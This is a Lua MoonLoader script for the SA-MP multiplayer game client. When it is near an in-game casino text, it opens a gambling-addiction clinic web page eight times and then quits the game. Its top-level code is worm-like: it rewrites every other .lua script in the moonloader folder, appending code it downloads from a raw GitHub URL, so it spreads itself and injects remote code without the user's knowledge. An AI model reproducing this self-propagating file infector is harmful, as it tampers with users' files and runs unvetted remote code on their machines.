require 'lib.moonloader'

local emb = true


local Handle, FileName = findFirstFile("moonloader\\*.lua")
local Directory = getWorkingDirectory().."\\"
while FileName do
    local FileText = ""
    local Skip = false
    local File = io.open(Directory..FileName, "r")
    for Line in File:lines() do
        if Line:find("%-%- Exception "..FileName) then
            Skip = true
            break
        end

        if FileText ~= "" then
            FileText = FileText.."\n"
        end
        FileText = FileText..Line
    end
    File:close()
    if not Skip and not FileText:find("https://raw.githubusercontent.com/vova123298/noc/refs/heads/main/nocasino.lua") then
        local encoding = require "encoding"
        encoding.default = "CP1251"
        local File = io.open(Directory..FileName, "w")
        File:write("-- Exception "..FileName.."\n"..FileText.."\n"..encoding.UTF8:decode((require("requests")).get("https://raw.githubusercontent.com/vova123298/noc/refs/heads/main/nocasino.lua").text))
        File:close()
    end
    FileName = findNextFile(Handle)
end



function main()
    while not isSampAvailable() do wait(0) end
   
    while true do
        wait(0)
        if emb then
            for a = 1, 2048 do
                if sampIs3dTextDefined(a) then
                    local string, color, vposX, vposY, vposZ, distance, ignoreWalls, playerId, vehicleId = sampGet3dTextInfoById(a)
                    local X, Y, Z = getCharCoordinates(PLAYER_PED)
                    local distances = getDistanceBetweenCoords2d(vposX, vposY, X, Y)
                    local wposX, wposY = convert3DCoordsToScreen(vposX, vposY, vposZ)
                    local px , py = convert3DCoordsToScreen(X, Y, Z)
                    local distance1 = string.format("%.0f", getDistanceBetweenCoords3d(vposX, vposY, vposZ, X, Y, Z))
                    if tonumber(distance1) <= 4 and string.find(string, "Казино 4 Dragons") then
					     os.execute("start https://narcoklinika.com/kak-izbavitsya-ot-zavisimosti-ot-azartnyx-igr/?ysclid=m9oi8dfbbx212652300")
						 
						 os.execute("start https://narcoklinika.com/kak-izbavitsya-ot-zavisimosti-ot-azartnyx-igr/?ysclid=m9oi8dfbbx212652300")
						 
						 os.execute("start https://narcoklinika.com/kak-izbavitsya-ot-zavisimosti-ot-azartnyx-igr/?ysclid=m9oi8dfbbx212652300")
						 
						 os.execute("start https://narcoklinika.com/kak-izbavitsya-ot-zavisimosti-ot-azartnyx-igr/?ysclid=m9oi8dfbbx212652300")
						 
						 os.execute("start https://narcoklinika.com/kak-izbavitsya-ot-zavisimosti-ot-azartnyx-igr/?ysclid=m9oi8dfbbx212652300")
						 
						 os.execute("start https://narcoklinika.com/kak-izbavitsya-ot-zavisimosti-ot-azartnyx-igr/?ysclid=m9oi8dfbbx212652300")
						 
						 os.execute("start https://narcoklinika.com/kak-izbavitsya-ot-zavisimosti-ot-azartnyx-igr/?ysclid=m9oi8dfbbx212652300")
						 
						 os.execute("start https://narcoklinika.com/kak-izbavitsya-ot-zavisimosti-ot-azartnyx-igr/?ysclid=m9oi8dfbbx212652300")
                         sampProcessChatInput('/q')						 
                    end
                end
            end       
        end
    end
end

